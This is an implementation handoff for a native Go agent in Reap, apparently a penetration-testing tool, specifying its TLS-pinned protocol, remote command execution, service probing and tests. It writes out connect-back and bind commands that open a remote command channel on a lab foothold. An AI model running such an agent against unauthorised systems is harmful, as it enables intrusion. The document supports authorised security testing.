# Native Reap agent implementation handoff

Add a compiled Go agent alongside the existing Python agent so Reap can attach to a lab foothold when the target has no usable Python interpreter. Deliver prebuilt executables for Linux amd64, Linux arm64 and Windows amd64. The target must not need Python, Go, a compiler, OpenSSL CLI or an installed Reap package.

The transport was implemented locally in Reap 1.12.0; Reap 1.13.0 replaces the operator workflow below with guided one-file setup. Start with the [agent quickstart](AGENT_QUICKSTART.md). Users no longer build agents or transfer separate credentials. The remaining text records the original transport requirements and advanced manual workflow. See [developer notes](native-agent/README.md) for maintenance details. No public release has been published.

## Starting point

The starting source is Reap 1.11.0, local commit `8a4fc781065286629b86c349c2561e3b3f14962d`. The last verified baseline is 73 passing tests in Kali WSL. Check the current checkout and rerun the baseline before implementation rather than assuming nothing has changed.

| Area | Current source | What matters |
|---|---|---|
| Target agent and protocol | [reap/data/reap_agent.py](reap/data/reap_agent.py) | Standalone Python 3.9+ agent; framing, authentication, command execution and listener behavior |
| Operator adapter | [reap/transport/agent.py](reap/transport/agent.py) | `AgentSession` implements exec, ping and close; authenticates in both connection directions |
| Kit generation | [reap/agent.py](reap/agent.py) | `prepare_bundle()` creates a fresh identity and copies the Python agent |
| Console | [reap/console.py](reap/console.py) | `do_agent`, `_register_agent`, `do_enum`, `do_ports`; registration fingerprints the target |
| Session contract | [reap/transport/base.py](reap/transport/base.py) | `Result` keeps stdout, stderr, real exit status and duration separate |
| Survey wrapper | [reap/survey.py](reap/survey.py) | `SurveySession` wraps exec and delegates optional session operations |
| Service identification | [reap/serviceinfo.py](reap/serviceinfo.py) | Currently sends a Python program to the target for `--probe` |
| Regression fixtures | [tests/test_agent.py](tests/test_agent.py), [tests/test_serviceinfo.py](tests/test_serviceinfo.py), [tests/test_survey.py](tests/test_survey.py) | Existing agent fixtures execute Python commands; these alone cannot prove Python-free operation |
| Packaging and CI | [pyproject.toml](pyproject.toml), [install.sh](install.sh), [.github/workflows/tests.yml](.github/workflows/tests.yml) | Preserve current Python installation; current Alpine test image itself contains Python |

An installed Kali copy may have been updated from a development checkout while retaining older Git metadata. Its working tree can contain source updates as local changes. Use the development checkout as the implementation source and preserve the installed copy's local changes and engagement files.

Leave unrelated working-tree changes alone. Check for applicable `AGENTS.md` files before editing.

## Implementation choice and scope

Use Go for a single agent codebase with platform-specific process management. Build with `CGO_ENABLED=0` and avoid dependencies that require a C runtime. Go supports OS and architecture selection at build time; runtime portability still needs testing against the selected targets. See the [Go build environment](https://go.dev/doc/install/source#environment) and [cgo documentation](https://pkg.go.dev/cmd/cgo).

Make Linux amd64 and arm64 executables independent of glibc, and verify that property on the artifacts. Include Windows amd64 as a separate `.exe`. Choose and pin a supported Go toolchain during implementation, record it in CI, and document its tested minimum OS requirements. Use the amd64 baseline instruction set rather than requiring optional CPU extensions. Cross-compilation proves that a target builds; it does not replace execution tests on that target.

Keep the existing Python agent available and preserve the current default `agent prepare <directory>` behavior. The native implementation must use the existing authenticated session interface. Collectors should not need separate native-agent versions.

This work includes normal command execution and Python-free service identification for Linux native sessions. Preserve the current Windows service-identification restriction unless Windows probing is implemented and tested explicitly. Keep the agent in the foreground, at the existing account's privileges, with one authenticated session and no persistence. PTYs, automatic reconnection and new port-forwarding transports are separate work.

## Proposed operator workflow

Extend kit generation with an explicit implementation and target selection:

```text
reap> agent prepare /tmp/reap-native-kit --type native --platform linux --arch amd64 --binary /path/to/reap-agent-linux-amd64
```

`--binary` supplies a locally available executable. It may be omitted only when a matching, verified artifact is already available in a documented package location. Select the target platform explicitly; the operator's own architecture is not a reliable default for a remote foothold. Fail with a useful message if the selected binary is missing or its executable format or architecture disagrees with the requested target. Do not silently switch to Python.

The kit should contain the selected executable as `reap-agent` on Linux or `reap-agent.exe` on Windows, plus the existing token, fingerprint, certificate and private key. Add a manifest with the agent implementation, build version, OS, architecture, protocol version, executable filename and SHA-256 digest. Keep the token and private key out of that manifest. A checksum detects a mismatch against a trusted manifest; it is not proof of publisher identity.

Preserve fresh-directory checks and private credential permissions. Linux executables should be executable only by the owner by default. Kit creation must work from an installed Reap package, not just a repository root.

Registration should stay the same:

```text
reap> register agent-listen 7443 --bundle /tmp/reap-native-kit --bind 0.0.0.0
```

For connect-back mode, transfer only the executable, `token.txt` and `fingerprint.txt` into a private target directory. Keep the TLS private key on the operator. From the target directory on Linux:

```bash
./reap-agent --connect 10.10.14.2 --port 7443 \
  --token-file ./token.txt --fingerprint-file ./fingerprint.txt
```

For bind mode, also transfer `cert.pem` and `key.pem` from the same kit, then run:

```bash
./reap-agent --bind 0.0.0.0 --port 7443 \
  --token-file ./token.txt --cert ./cert.pem --key ./key.pem
```

Connect from the operator:

```text
reap> register agent 10.10.10.5 7443 --bundle /tmp/reap-native-kit
reap> enum --save
reap> ports --probe
reap> !id
reap> interact
```

Document the equivalent Windows executable invocation using `reap-agent.exe`. Missing shells, executable permissions, `noexec` mounts and unsupported OS versions must produce actionable errors. Do not claim the binary can run where execution is prohibited.

## Preserve the current wire protocol

Implement the protocol from `reap/data/reap_agent.py`, not a new newline-based protocol. Keep protocol version `1` for existing operations. Add an optional advertised capability only for the new probe operation described below.

### Framing and authentication

- Each frame is a four-byte unsigned big-endian length followed by exactly that many bytes of UTF-8 JSON. The top-level JSON value must be an object. Valid payload sizes are 1 through 8,388,608 bytes. Reject invalid lengths before allocating the payload and handle fragmented reads and writes.
- Use TLS 1.2 or newer. The TLS client must verify the SHA-256 fingerprint of the server's leaf certificate in DER form before transmitting an authentication token. Existing fingerprints are hexadecimal; normalization accepts colon separators and surrounding whitespace. Generated self-signed kit certificates must work without a target CA installation.
- Use a constant-time token comparison, require the existing minimum token length, and do not log tokens or private keys. Retain bounded handshake attempts and the 60-second authenticated-listener window. Invalid clients must not consume that entire window through repeated per-connection timeout resets.
- In connect-back mode the native agent is the TLS client: it sends `auth`; the Reap listener validates the token and sends `ready`. In bind mode Reap is the TLS client: it sends `auth`; the native agent validates the token and sends `ready`.

Authentication messages carry `version: 1`, `platform` and `hostname`; the `auth` message also carries `token`. Agent platform values must be `Linux` or `Windows`, with this capitalization. `AgentSession` currently selects Windows command behavior from the exact `Windows` value. Announce the target's metadata in the agent's side of the exchange, not the operator's metadata.

Go's TLS API supports custom certificate verification through `VerifyConnection`. If default CA/hostname verification is replaced for these pinned certificates, the mandatory pin check must remain active for every connection. Do not ship an unverified TLS mode. See [Go TLS configuration](https://pkg.go.dev/crypto/tls#Config).

### Requests and responses

| Request | Required behavior |
|---|---|
| `{"id":1,"op":"ping"}` | Respond `{"id":1,"op":"pong"}` |
| `{"id":2,"op":"exec","command":"...","timeout":30}` | Respond with matching `id`, `op: "result"`, `stdout`, `stderr`, numeric `exit_code` and numeric `duration` in seconds |
| `{"op":"close"}` | Close the session and exit; no response is required |

Preserve request IDs as integers. Serialize requests and never interleave their output. Unknown operations, malformed frames and broken exchanges close the connection; do not keep using a stream with uncertain framing. An ordinary nonzero command exit is a result and must not close an otherwise healthy session.

### Command execution and resource limits

Go's `os/exec` does not invoke a shell automatically. Explicitly use `/bin/sh -c` on Linux and the supported Windows command processor on Windows, preserving the command string's quoting and redirects. Do not split shell commands into whitespace-delimited arguments. See [Go command execution](https://pkg.go.dev/os/exec).

Match these existing execution semantics:

| Property | Contract |
|---|---|
| Command length | Reject more than 256 Ki Unicode code points, matching Python's current string-length check |
| Command timeout | Clamp to 0.1 through 300 seconds |
| Output | Separate stdout and stderr; bounded concurrent draining of both |
| Output cap | 524,288 captured bytes per stream; count bytes before UTF-8 replacement |
| Normal completion | Return the command's exit status, elapsed duration and captured output |
| Timeout | Exit code `124` and a clear partial-output diagnostic |
| Output cap reached | Exit code `125` and a clear truncation diagnostic; stop the command |
| Text decoding | Replace invalid UTF-8 deterministically instead of breaking JSON serialization |

Use a process group for Linux command cleanup, including background children that retain output pipes after the parent shell exits. Clean up on timeout, output cap, agent interruption and connection failure. Do not let pipe readers or cleanup waits defeat the command deadline.

Use Windows Job Objects for command-tree cleanup where supported and handle assignment failures explicitly. Never claim the tree was stopped if cleanup failed. Avoid a launch/assignment race that lets children escape the intended job. The Python implementation currently has weaker Windows cleanup, so preserve interoperability without copying that limitation into the new implementation. See [Windows Job Objects](https://learn.microsoft.com/en-us/windows/win32/procthread/job-objects).

## Remove the second Python dependency from service probing

Replacing the target agent alone leaves `ports --probe` and `enum --probe` dependent on target Python. `identify_services()` in `reap/serviceinfo.py` currently searches for `python3` or `python`, sends `_REMOTE`, and marks identification unavailable if neither exists. Address this in the same implementation so a native session can identify the loopback web service on port 3000 that motivated the earlier enumeration improvements.

Add an optional capability such as `probe_tcp_v1` to native agent metadata, in `auth` for connect-back and `ready` for bind mode. Older messages omit capabilities and must remain valid. Store the peer's capabilities on `AgentSession`; do not send an unsupported operation to an older Python agent, because its current server closes on unknown operations.

Expose the capability through an optional session method such as `probe_tcp(endpoints)`, with a default `NotSupported` implementation on `Session`. Delegate it explicitly through `SurveySession`: adding a base-class method means `__getattr__` alone will not forward it. `identify_services()` should use a supported native method first and retain the current Python fallback for other sessions. Keep collection modules independent of a particular transport implementation.

Use a framed `probe_tcp` request and a matching `probe_result` response with JSON rows that normalize to the existing service-identification evidence and coverage model. The proposed shape is:

```json
{"id":3,"op":"probe_tcp","endpoints":[{"proto":"tcp","ip":"127.0.0.1","port":3000,"addr":"127.0.0.1:3000"}]}
```

```json
{"id":3,"op":"probe_result","rows":[{"proto":"tcp","ip":"127.0.0.1","port":3000,"addr":"127.0.0.1:3000","status":"completed","protocol":"http","http_status":"HTTP/1.0 200 OK","title":"Lab application"}],"duration":0.01}
```

Validate endpoint types, address family and port range. Define and test optional evidence fields against the existing `identify_services()` renderer. Extend the expected-response mapping in `AgentSession._request()`: it currently expects `pong` for every operation except `exec`, so it would reject a native probe response without this change. Reject malformed input and enforce limits inside the agent as well as on the operator. A malformed native response or failed exchange must become coverage and a closed channel, not a hidden retry through the Python fallback.

Preserve the current probing scope: only explicitly supplied, already discovered TCP endpoints; 12 selected by default, a hard ceiling of 24; at most 64 KiB read per endpoint; a 55-second overall budget and short per-operation deadlines. Map wildcard binds to target loopback, preserve IPv4/IPv6 distinctions, and never follow redirects or expand into a port-range scan. Return HTTP status, server header, title and redirect location when present, plus banner or TLS certificate metadata where available. Probe metadata must distinguish observed TLS encryption from verified application-service identity.

Keep `--probe` opt-in and preserve partial, unavailable and timeout coverage. Empty or failed responses must not become claims that a service does not exist. Update the Linux/Python help text in `do_enum`, `do_ports`, README and USAGE to describe when native probing is available. Windows probing remains explicitly unsupported unless its console gates and fixtures are extended as part of a tested addition.

## Files and release packaging

Use a separate Go module, for example:

```text
native-agent/
  go.mod
  cmd/reap-agent/main.go
  internal/protocol/
  internal/execution/
  internal/probe/
```

Keep OS-specific execution and cleanup behind Go build tags. Prefer standard-library networking, TLS and JSON. If Windows process management needs `golang.org/x/sys/windows`, pin its version as a build dependency; the resulting target executable must remain self-contained.

Add a repeatable build script and release artifact manifest. Example build commands, once that module exists, are:

```bash
cd native-agent
mkdir -p dist
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 GOAMD64=v1 go build -trimpath -o dist/reap-agent-linux-amd64 ./cmd/reap-agent
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -trimpath -o dist/reap-agent-linux-arm64 ./cmd/reap-agent
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 GOAMD64=v1 go build -trimpath -o dist/reap-agent-windows-amd64.exe ./cmd/reap-agent
```

Record source revision, toolchain version and SHA-256 digests. Publish binaries through an explicit release process rather than committing generated executables or lab credentials. Source archives will include the tracked Go source after it is committed; they do not automatically contain built executables. Explain how an offline operator supplies `--binary` from a copied release artifact or local build.

Normal `bash install.sh --pipx --full` must continue working without Go installed on Kali. Do not make compilation or binary downloads an implicit side effect of the default Python installation. If automatic artifact retrieval is added later, make it explicit and verify artifacts against a trusted release manifest. Include any bundled runtime assets in wheel/sdist package data and test from an installed package outside the checkout.

## Verification and acceptance criteria

Extend tests rather than relying on manual attachment. Keep the existing Python agent fixtures and add the following coverage:

1. Native bind and connect-back sessions interoperate with `AgentSession`. Verify authentication direction, exact platform mapping, request IDs, ping and clean close. Both Python-agent modes continue to work.
2. Wrong tokens, wrong certificate pins and malformed or oversized frames fail without command execution. A failed pin must prevent token transmission. Test fragmented frames and premature EOF.
3. Commands return separate stdout/stderr and exit code 7 without using Python as a target fixture. Test quoted paths, pipelines, Unicode, invalid output bytes and simultaneous large stdout/stderr.
4. Timeout and output-cap tests prove bounded memory, bounded cleanup and stopped child processes. A healthy channel remains usable after a normal command timeout or cap response. Broken transport exchanges close the channel.
5. A real target container or VM has no Python interpreter. Do not satisfy this by hiding Python from PATH while continuing to call an absolute Python executable. The current `python:3.12-alpine` CI job does not meet this requirement. Keep Python and the test runner on the operator side and use a separate target namespace.
6. From that Python-free Linux target, run fingerprinting, `enum --save`, `ports`, shell commands and native `ports --probe`. A compiled HTTP fixture bound to target `127.0.0.1:3000` must appear as a listener and return its title through native probing. Exercise the procfs fallback with `ss` and `netstat` absent.
7. A minimal Alpine/BusyBox target runs the Linux binary without glibc or an external TLS tool. Execute the arm64 artifact on an arm64 runner or documented emulation; label cross-build-only checks honestly. Execute Windows command and cleanup fixtures on a Windows runner.
8. Optional native-probe capability survives the survey wrapper. Existing Python agents and SSH/raw-shell/webshell sessions retain their previous behavior. Unsupported probe operations are not sent to older peers.
9. Native kit preparation checks implementation, OS and architecture, copies the intended binary, preserves new-directory protection and permissions, and works from an installed wheel. No private kit material appears in release assets or Git status.
10. The complete existing test suite passes alongside Go tests. Record exact commands and which runtime environments were exercised. Recheck package contents, installer help and documentation examples.

Once complete, update README, USAGE, CHANGELOG, console help and build/release documentation. Clearly separate the operator's Python requirement from the native target's requirements. Do not describe native agent support as released until executable artifacts and the Python-free target tests exist.

Update an installed Kali copy only after testing the implementation. Create a fresh private backup before changing its source or environment. Preserve engagement data and verify that the existing launcher still works after the update.

## Suggested implementation order

First capture protocol interoperability fixtures and implement the Go framing, TLS/authentication and Linux execution path. Add native kit selection and test both registration directions. Then implement the negotiated native probe capability and verify the Python-free port-3000 case. Complete Windows process management and the release/test matrix before declaring all advertised platforms supported.

Do not overwrite the user's existing source changes or publish a release merely to satisfy this handoff. Deliver reviewable source, tested binaries and documentation for the supported platforms, with any remaining platform limits stated precisely.
